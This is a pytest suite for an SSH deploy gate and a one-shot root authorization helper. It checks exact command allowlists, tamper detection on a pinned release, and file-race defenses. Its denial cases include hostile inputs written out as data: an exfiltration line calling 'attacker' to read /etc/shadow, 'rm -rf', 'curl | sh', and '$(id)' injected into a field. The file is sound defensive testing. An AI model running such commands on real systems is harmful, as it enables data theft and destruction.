"""Exact-byte tests for the BEAAA-23703 d9 one-shot host-gate candidate.

Run from the candidate directory:

    python3 -m pytest -q tests/test_d9_host_gate.py

The tests load the candidate files themselves, not a copy. Nothing here
installs, arms, or deploys anything: every filesystem effect stays inside
pytest's temporary directories and the one privileged call is stubbed. Set
D9_REPO to point the git-derived pin check at a clone that holds the commit.
"""

import hashlib
import importlib.machinery
import importlib.util
import os
import pathlib
import stat
import subprocess

import pytest

CANDIDATE = pathlib.Path(__file__).resolve().parent.parent
_PARENTS = pathlib.Path(__file__).resolve().parents
_ENV_REPO = os.environ.get("D9_REPO")
REPO = pathlib.Path(_ENV_REPO) if _ENV_REPO else (_PARENTS[4] if len(_PARENTS) > 4 else _PARENTS[-1])
D9 = "d9d680f53db7de263f026be5284c97229126872c"
D9_TREE = "da7883541fa77ec9712a07c5d4683bcd054c1e91"
A68 = "a68e7e0969b45e7eb8add18ff2007a305a0156aa"


def _load(name, filename):
    loader = importlib.machinery.SourceFileLoader(name, str(CANDIDATE / filename))
    spec = importlib.util.spec_from_loader(name, loader)
    module = importlib.util.module_from_spec(spec)
    loader.exec_module(module)
    return module


gate = _load("d9_gate", "backbond-real-agent-demo-ssh-gate")
authorize = _load("d9_authorize", "backbond-real-agent-demo-authorize")
verifier = _load("d9_verifier", "verify_release_manifest.py")

GATE_SOURCE = (CANDIDATE / "backbond-real-agent-demo-ssh-gate").read_bytes()
AUTHORIZE_SOURCE = (CANDIDATE / "backbond-real-agent-demo-authorize").read_bytes()
SUDOERS_SOURCE = (CANDIDATE / "backbond-real-agent-demo-authorize.sudoers").read_bytes()

ROOT = gate.RELEASE_DIR
DEPLOY_OK = (
    "DEMO_GIT_SHA='%s' DEMO_DEPLOYED_AT='2026-08-16T15:04:05Z' "
    "bash '%s/demo-real-agent/deploy.sh' '%s'" % (D9, ROOT, ROOT)
)


# ---------------------------------------------------------------------------
# allowlist: only the shapes the d9 workflow emits
# ---------------------------------------------------------------------------


def test_release_directory_is_pinned_to_d9():
    assert ROOT == "/opt/backbond-real-agent-demo/releases/" + D9
    assert gate.SHA == D9


def test_exact_mkdir_is_permitted():
    assert gate.resolve("mkdir -p " + ROOT) == ("mkdir", None)


def test_exact_extract_is_permitted():
    assert gate.resolve("cd %s && tar -xzf real-agent-demo-release.tgz" % ROOT) == ("extract", None)


def test_exact_deploy_is_permitted():
    assert gate.resolve(DEPLOY_OK) == ("deploy", "2026-08-16T15:04:05Z")


@pytest.mark.parametrize("command", sorted(gate.SFTP_SUBSYSTEM_SHAPES))
def test_sftp_subsystem_shapes_reach_the_confined_sink(command):
    """OpenSSH >= 9.0 scp(1) speaks SFTP, so this is the workflow's upload."""
    assert gate.resolve(command) == ("sftp-sink", None)


@pytest.mark.parametrize("command", sorted(gate.SCP_SINK_SHAPES))
def test_legacy_scp_sink_shapes_reach_the_confined_sink(command):
    assert gate.resolve(command) == ("scp-sink", None)


def test_sftp_shapes_cover_the_openssh_layouts_we_may_meet():
    assert "/usr/lib/openssh/sftp-server" in gate.SFTP_SUBSYSTEM_SHAPES
    assert "internal-sftp" in gate.SFTP_SUBSYSTEM_SHAPES


@pytest.mark.parametrize("command", ["/usr/lib/openssh/sftp-server ", "internal-sftp ", "sftp-server  "])
def test_subsystem_trailing_space_is_accepted(command):
    """sshd appends a space to a Subsystem line that carries no arguments.

    Observed directly: a forced command sees SSH_ORIGINAL_COMMAND
    "/usr/lib/openssh/sftp-server " when scp(1) opens the sftp subsystem.
    """
    assert gate.resolve(command) == ("sftp-sink", None)


# ---------------------------------------------------------------------------
# denials
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "",                                       # interactive login
        "mkdir -p /opt/backbond-real-agent-demo/releases/" + A68,
        "cd /opt/backbond-real-agent-demo/releases/%s && tar -xzf real-agent-demo-release.tgz" % A68,
        "scp -t /opt/backbond-real-agent-demo/releases/%s/" % A68,
        "mkdir -p /opt/backbond-real-agent-demo/releases/" + "0" * 40,
        "mkdir -p " + ROOT + " /tmp/extra",
        "mkdir -p " + ROOT + "; rm -rf /opt/backbond-real-agent-demo",
        "mkdir -p " + ROOT + " && whoami",
        "mkdir -p " + ROOT + "/..",
        "mkdir -p " + ROOT + "\n",
        " mkdir -p " + ROOT,
        "mkdir -p " + ROOT + " ",
        "cd %s && tar -xzf other.tgz" % ROOT,
        "cd %s && tar -xzf real-agent-demo-release.tgz --to-command=sh" % ROOT,
        "cd %s && tar -xzf real-agent-demo-release.tgz && curl http://x" % ROOT,
        "tar -xzf %s/real-agent-demo-release.tgz" % ROOT,
        "scp -t /tmp",
        "scp -f %s/real-agent-demo-release.tgz" % ROOT,   # no reads out of the host
        "scp -t -r " + ROOT + "/",
        "/usr/lib/openssh/sftp-server -f AUTH -l INFO",
        "/usr/lib/openssh/sftp-server -R",
        "bash",
        "sh -c 'id'",
        "whoami",
        "sudo -n /usr/local/sbin/backbond-real-agent-demo-authorize",
        "sudo -n /usr/local/sbin/backbond-real-agent-demo-secret-preflight",
    ],
)
def test_denied_commands(command):
    with pytest.raises(gate.Rejected):
        gate.resolve(command)


@pytest.mark.parametrize(
    "command",
    [
        DEPLOY_OK.replace(D9, A68),
        DEPLOY_OK.replace(
            "bash '%s/demo" % ROOT,
            "bash '/opt/backbond-real-agent-demo/releases/%s/demo" % A68,
        ),
        DEPLOY_OK.replace("2026-08-16T15:04:05Z", "$(id)"),
        DEPLOY_OK.replace("2026-08-16T15:04:05Z", "2026-08-16T15:04:05"),
        DEPLOY_OK.replace("2026-08-16T15:04:05Z", ""),
        DEPLOY_OK.replace("2026-08-16T15:04:05Z", "2026-08-16T15:04:05Z' EXTRA='1"),
        DEPLOY_OK.replace("bash '", "sh '"),
        DEPLOY_OK.replace("deploy.sh", "install_claude_judge_proxy.sh"),
        DEPLOY_OK.replace("deploy.sh", "../../../etc/backbond/deploy.sh"),
        DEPLOY_OK + " --force",
        DEPLOY_OK + "; whoami",
        "DEMO_GIT_SHA='%s' bash '%s/demo-real-agent/deploy.sh' '%s'" % (D9, ROOT, ROOT),
        "PATH=/tmp " + DEPLOY_OK,
    ],
)
def test_denied_deploy_variants(command):
    with pytest.raises(gate.Rejected):
        gate.resolve(command)


def test_deploy_root_argument_must_be_the_pinned_release():
    with pytest.raises(gate.Rejected):
        gate.resolve(DEPLOY_OK[: DEPLOY_OK.rindex("'" + ROOT + "'")] + "'/tmp'")


def test_gate_refuses_to_run_as_root(monkeypatch):
    monkeypatch.setattr(os, "geteuid", lambda: 0)
    monkeypatch.setattr(os, "getegid", lambda: 0)
    with pytest.raises(SystemExit):
        gate.require_unprivileged()


def test_denial_does_not_echo_client_text(capsys):
    with pytest.raises(SystemExit) as excinfo:
        gate.deny("command is not allowlisted", "curl http://attacker/$(cat /etc/shadow)")
    assert excinfo.value.code == 1
    err = capsys.readouterr().err
    assert "attacker" not in err and "shadow" not in err
    assert hashlib.sha256(b"curl http://attacker/$(cat /etc/shadow)").hexdigest() in err


# ---------------------------------------------------------------------------
# the release must be the pinned d9 tree
# ---------------------------------------------------------------------------


def build_release(tmp_path):
    root = tmp_path / "release"
    (root / "demo-real-agent").mkdir(parents=True)
    (root / "api").mkdir()
    (root / "demo-real-agent" / "deploy.sh").write_text("#!/usr/bin/env bash\necho deploy\n")
    (root / "api" / "app.py").write_text("print('app')\n")
    os.chmod(root / "demo-real-agent" / "deploy.sh", 0o755)
    (root / "real-agent-demo-release.tgz").write_bytes(b"archive bytes are not part of the tree")
    return root


def pin_release(monkeypatch, root):
    count, digest = verifier.from_tree(root)
    monkeypatch.setattr(gate, "RELEASE_DIR", str(root))
    monkeypatch.setattr(gate, "DEPLOY_SCRIPT", str(root / "demo-real-agent" / "deploy.sh"))
    monkeypatch.setattr(gate, "EXPECTED_FILES", count)
    monkeypatch.setattr(gate, "EXPECTED_TREE_SHA256", digest)
    return count, digest


def test_matching_release_passes(monkeypatch, tmp_path):
    root = build_release(tmp_path)
    count, digest = pin_release(monkeypatch, root)
    assert gate.verify_pinned_tree() == (count, digest)


def test_archive_is_excluded_from_the_pin(monkeypatch, tmp_path):
    root = build_release(tmp_path)
    pin_release(monkeypatch, root)
    (root / "real-agent-demo-release.tgz").write_bytes(b"a completely different archive")
    gate.verify_pinned_tree()


@pytest.mark.parametrize(
    "tamper",
    [
        lambda root: (root / "api" / "backdoor.py").write_text("import os\n"),
        lambda root: (root / "api" / "app.py").write_text("print('app') # tampered\n"),
        lambda root: os.unlink(root / "api" / "app.py"),
        lambda root: (root / "demo-real-agent" / "deploy.sh").write_text("curl http://x | sh\n"),
    ],
)
def test_tampered_release_is_rejected(monkeypatch, tmp_path, tamper):
    root = build_release(tmp_path)
    pin_release(monkeypatch, root)
    tamper(root)
    with pytest.raises(gate.Rejected):
        gate.verify_pinned_tree()


def test_pin_covers_content_and_names_but_not_permission_bits(monkeypatch, tmp_path):
    """Documented limit: tar applies the account umask, so modes are not pinned.

    Nothing in the release is executed by its permission bits — deploy.sh and
    every helper it calls are invoked through an explicit interpreter — so the
    content and name pin is what binds.
    """
    root = build_release(tmp_path)
    count, digest = pin_release(monkeypatch, root)
    os.chmod(root / "api" / "app.py", 0o755)
    assert gate.verify_pinned_tree() == (count, digest)


def test_symlinked_file_changes_the_digest(monkeypatch, tmp_path):
    root = build_release(tmp_path)
    pin_release(monkeypatch, root)
    os.unlink(root / "api" / "app.py")
    os.symlink("/etc/passwd", root / "api" / "app.py")
    with pytest.raises(gate.Rejected):
        gate.verify_pinned_tree()


def test_symlinked_directory_changes_the_digest(monkeypatch, tmp_path):
    root = build_release(tmp_path)
    pin_release(monkeypatch, root)
    outside = tmp_path / "outside"
    (outside / "nested").mkdir(parents=True)
    (outside / "nested" / "payload.py").write_text("payload\n")
    os.symlink(str(outside), root / "extra")
    with pytest.raises(gate.Rejected):
        gate.verify_pinned_tree()


def test_pinned_digest_is_exactly_the_d9_tree_in_git():
    head = subprocess.run(
        ["git", "-C", str(REPO), "rev-parse", D9 + "^{tree}"], capture_output=True, text=True
    )
    if head.returncode != 0:
        pytest.skip("commit %s is not present in %s" % (D9, REPO))
    assert head.stdout.strip() == D9_TREE
    count, digest = verifier.from_git(REPO, D9)
    assert (count, digest) == (gate.EXPECTED_FILES, gate.EXPECTED_TREE_SHA256)


# ---------------------------------------------------------------------------
# one-shot authorization: ordering, shape, and unprivileged execution
# ---------------------------------------------------------------------------


class FakeSudo(object):
    def __init__(self, stdout="", returncode=0):
        self.stdout = stdout
        self.returncode = returncode
        self.calls = []

    def __call__(self, argv, **kwargs):
        self.calls.append(argv)
        return subprocess.CompletedProcess(argv, self.returncode, self.stdout, "")


def test_deploy_verifies_then_consumes_then_execs_unprivileged(monkeypatch, tmp_path):
    root = build_release(tmp_path)
    pin_release(monkeypatch, root)
    sudo = FakeSudo(stdout="authorized: %s\n" % D9)
    monkeypatch.setattr(gate.subprocess, "run", sudo)
    execs = []
    monkeypatch.setattr(os, "execve", lambda *a: execs.append(a))

    gate.do_deploy("2026-08-16T15:04:05Z")

    assert sudo.calls == [
        ["/usr/bin/sudo", "--non-interactive", "/usr/local/sbin/backbond-real-agent-demo-authorize"]
    ]
    path, argv, env = execs[0]
    assert path == "/bin/bash"
    assert argv == ["/bin/bash", str(root / "demo-real-agent" / "deploy.sh"), str(root)]
    assert env["DEMO_GIT_SHA"] == D9
    assert env["DEMO_DEPLOYED_AT"] == "2026-08-16T15:04:05Z"
    assert set(env) == {"PATH", "HOME", "USER", "LOGNAME", "DEMO_GIT_SHA", "DEMO_DEPLOYED_AT"}
    assert env["PATH"] == "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"


def test_helper_is_called_with_no_client_controlled_argument(monkeypatch, tmp_path):
    root = build_release(tmp_path)
    pin_release(monkeypatch, root)
    sudo = FakeSudo(stdout="authorized: %s\n" % D9)
    monkeypatch.setattr(gate.subprocess, "run", sudo)
    monkeypatch.setattr(os, "execve", lambda *a: None)
    gate.do_deploy("2026-08-16T15:04:05Z")
    assert len(sudo.calls[0]) == 3
    assert D9 not in sudo.calls[0]


def test_a_bad_release_never_spends_the_one_shot_grant(monkeypatch, tmp_path):
    root = build_release(tmp_path)
    pin_release(monkeypatch, root)
    (root / "api" / "backdoor.py").write_text("import os\n")
    sudo = FakeSudo(stdout="authorized: %s\n" % D9)
    monkeypatch.setattr(gate.subprocess, "run", sudo)
    execs = []
    monkeypatch.setattr(os, "execve", lambda *a: execs.append(a))

    with pytest.raises(gate.Rejected):
        gate.do_deploy("2026-08-16T15:04:05Z")

    assert sudo.calls == []
    assert execs == []


@pytest.mark.parametrize(
    "stdout,returncode",
    [
        ("", 1),                              # unarmed, or already consumed
        ("authorized: %s\n" % A68, 0),        # stale a68 authorization
        ("authorized:\n", 0),
        ("", 0),
        ("authorized: %s extra\n" % D9, 0),
        ("Authorized: %s\n" % D9, 0),
    ],
)
def test_deploy_denied_without_an_exact_d9_grant(monkeypatch, tmp_path, stdout, returncode):
    root = build_release(tmp_path)
    pin_release(monkeypatch, root)
    monkeypatch.setattr(gate.subprocess, "run", FakeSudo(stdout=stdout, returncode=returncode))
    execs = []
    monkeypatch.setattr(os, "execve", lambda *a: execs.append(a))
    with pytest.raises(gate.Rejected):
        gate.do_deploy("2026-08-16T15:04:05Z")
    assert execs == []


def test_absent_deploy_script_is_rejected(monkeypatch, tmp_path):
    root = build_release(tmp_path)
    pin_release(monkeypatch, root)
    os.unlink(root / "demo-real-agent" / "deploy.sh")
    with pytest.raises(gate.Rejected):
        gate.do_deploy("2026-08-16T15:04:05Z")


def test_symlinked_deploy_script_is_rejected(monkeypatch, tmp_path):
    root = build_release(tmp_path)
    pin_release(monkeypatch, root)
    script = root / "demo-real-agent" / "deploy.sh"
    os.unlink(script)
    os.symlink("/bin/sh", script)
    with pytest.raises(gate.Rejected):
        gate.do_deploy("2026-08-16T15:04:05Z")


# ---------------------------------------------------------------------------
# root authorization helper
# ---------------------------------------------------------------------------


@pytest.fixture
def armed(tmp_path, monkeypatch):
    state = tmp_path / "backbond"
    state.mkdir(mode=0o700)
    allow = state / "real-agent-demo-deploy.allow"
    allow.write_text(D9 + "\n")
    os.chmod(allow, 0o600)
    monkeypatch.setattr(authorize, "EXPECTED_UID", os.getuid())
    monkeypatch.setattr(authorize, "EXPECTED_GID", os.getgid())
    return state, allow, state / "real-agent-demo-deploy.consumed"


def call(state, allow, consumed):
    return authorize.authorize(str(state), str(allow), str(consumed))


def test_authorization_is_consumed_exactly_once(armed):
    state, allow, consumed = armed
    assert call(state, allow, consumed) == D9
    assert not allow.exists() and consumed.exists()
    with pytest.raises(authorize.AuthorizationError) as excinfo:
        call(state, allow, consumed)
    assert excinfo.value.args[0] == "absent"


def test_consumption_is_a_same_directory_rename(armed):
    state, allow, consumed = armed
    assert os.path.dirname(authorize.ALLOW_PATH) == os.path.dirname(authorize.CONSUMED_PATH)
    before = allow.stat().st_ino
    call(state, allow, consumed)
    assert consumed.stat().st_ino == before   # renamed in place, not copied


def test_wrong_release_is_refused_and_left_in_place(armed):
    state, allow, consumed = armed
    allow.write_text(A68 + "\n")
    os.chmod(allow, 0o600)
    with pytest.raises(authorize.AuthorizationError) as excinfo:
        call(state, allow, consumed)
    assert excinfo.value.args[0] == "wrong_release"
    assert allow.exists() and not consumed.exists()


@pytest.mark.parametrize(
    "content,reason",
    [
        ("", "wrong_release"),
        (D9[:-1] + "0\n", "wrong_release"),
        (D9.upper() + "\n", "wrong_release"),
        (D9 + " " + A68 + "\n", "wrong_release"),
        ("x" * 200, "oversized"),
    ],
)
def test_authorization_content_must_be_exactly_d9(armed, content, reason):
    state, allow, consumed = armed
    allow.write_text(content)
    os.chmod(allow, 0o600)
    with pytest.raises(authorize.AuthorizationError) as excinfo:
        call(state, allow, consumed)
    assert excinfo.value.args[0] == reason
    assert allow.exists()


@pytest.mark.parametrize("mode", [0o644, 0o660, 0o666, 0o700])
def test_authorization_mode_must_be_0600(armed, mode):
    state, allow, consumed = armed
    os.chmod(allow, mode)
    with pytest.raises(authorize.AuthorizationError) as excinfo:
        call(state, allow, consumed)
    assert excinfo.value.args[0] == "wrong_mode"


def test_authorization_owner_must_match(armed, monkeypatch):
    state, allow, consumed = armed
    monkeypatch.setattr(authorize, "EXPECTED_UID", os.getuid() + 1)
    with pytest.raises(authorize.AuthorizationError) as excinfo:
        authorize._read_authorization(str(allow))
    assert excinfo.value.args[0] == "wrong_owner"
    # the same mismatch on the containing directory is refused one step earlier
    with pytest.raises(authorize.AuthorizationError) as excinfo:
        call(state, allow, consumed)
    assert excinfo.value.args[0] == "state_dir_wrong_owner"
    assert allow.exists() and not consumed.exists()


def test_symlinked_authorization_is_refused(armed, tmp_path):
    state, allow, consumed = armed
    target = tmp_path / "elsewhere"
    target.write_text(D9 + "\n")
    os.chmod(target, 0o600)
    os.unlink(allow)
    os.symlink(str(target), allow)
    with pytest.raises(authorize.AuthorizationError) as excinfo:
        call(state, allow, consumed)
    assert excinfo.value.args[0] == "not_regular"


def test_fifo_authorization_is_refused(armed):
    state, allow, consumed = armed
    os.unlink(allow)
    os.mkfifo(allow, 0o600)
    with pytest.raises(authorize.AuthorizationError) as excinfo:
        call(state, allow, consumed)
    assert excinfo.value.args[0] == "not_regular"


@pytest.mark.parametrize(
    "field,reason",
    [
        ("uid", "opened_wrong_owner"),
        ("gid", "opened_wrong_owner"),
        ("mode", "opened_wrong_mode"),
        ("type", "opened_not_regular"),
        ("ino", "changed_during_check"),
    ],
)
def test_opened_descriptor_is_revalidated(armed, monkeypatch, field, reason):
    """A same-inode metadata race after the lstat must fail closed."""
    state, allow, consumed = armed
    real_fstat = os.fstat

    class Faked(object):
        def __init__(self, base):
            self._base = base

        def __getattr__(self, name):
            return getattr(self._base, name)

    def fake_fstat(fd):
        base = real_fstat(fd)
        faked = Faked(base)
        if field == "uid":
            faked.st_uid = base.st_uid + 1
        elif field == "gid":
            faked.st_gid = base.st_gid + 1
        elif field == "mode":
            faked.st_mode = stat.S_IFREG | 0o644
        elif field == "type":
            faked.st_mode = stat.S_IFIFO | 0o600
        elif field == "ino":
            faked.st_ino = base.st_ino + 1
        return faked

    monkeypatch.setattr(os, "fstat", fake_fstat)
    with pytest.raises(authorize.AuthorizationError) as excinfo:
        call(state, allow, consumed)
    assert excinfo.value.args[0] == reason
    assert allow.exists()


def test_state_directory_must_not_be_writable(armed):
    state, allow, consumed = armed
    os.chmod(state, 0o777)
    try:
        with pytest.raises(authorize.AuthorizationError) as excinfo:
            call(state, allow, consumed)
        assert excinfo.value.args[0] == "state_dir_writable"
    finally:
        os.chmod(state, 0o700)


def test_helper_rejects_every_argument():
    for argv in (["h", ""], ["h", "/etc/passwd"], ["h", D9], ["h", "--consume"]):
        assert authorize.main(argv) == 2


def test_helper_requires_root(monkeypatch):
    monkeypatch.setattr(os, "geteuid", lambda: 1002)
    assert authorize.main(["h"]) == 2


# ---------------------------------------------------------------------------
# static properties of the candidate bytes
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("source", [GATE_SOURCE, AUTHORIZE_SOURCE])
def test_fixed_interpreter_without_path_resolution(source):
    assert source.split(b"\n", 1)[0] == b"#!/usr/bin/python3"


@pytest.mark.parametrize("source", [GATE_SOURCE, AUTHORIZE_SOURCE])
def test_no_shell_evaluation_of_client_input(source):
    for forbidden in (b"shell=True", b"os.system", b"os.popen", b"eval(", b"/bin/sh"):
        assert forbidden not in source


@pytest.mark.parametrize("source", [GATE_SOURCE, AUTHORIZE_SOURCE, SUDOERS_SOURCE])
def test_no_stale_a68_authority_in_the_candidate(source):
    assert A68.encode() not in source


@pytest.mark.parametrize("source", [GATE_SOURCE, AUTHORIZE_SOURCE])
def test_both_programs_are_pinned_to_d9(source):
    assert D9.encode() in source


def test_sudoers_grants_exactly_one_zero_argument_command():
    text = SUDOERS_SOURCE.decode()
    assert text == (
        '#1002 ALL=(root) NOPASSWD: '
        '/usr/local/sbin/backbond-real-agent-demo-authorize ""\n'
    )
    assert "ALL=(ALL)" not in text
    assert "*" not in text
    assert "deploy.sh" not in text


def test_sudoers_passes_visudo():
    if not os.path.exists("/usr/sbin/visudo"):
        pytest.skip("visudo is not available")
    result = subprocess.run(
        ["/usr/sbin/visudo", "-cf", str(CANDIDATE / "backbond-real-agent-demo-authorize.sudoers")],
        capture_output=True,
    )
    assert result.returncode == 0, result.stderr


def test_recorded_hashes_recompute():
    lines = (CANDIDATE / "SHA256SUMS").read_text().splitlines()
    assert lines, "SHA256SUMS is empty"
    for line in lines:
        digest, name = line.split(None, 1)
        name = name.lstrip("*").strip()
        assert hashlib.sha256((CANDIDATE / name).read_bytes()).hexdigest() == digest, name
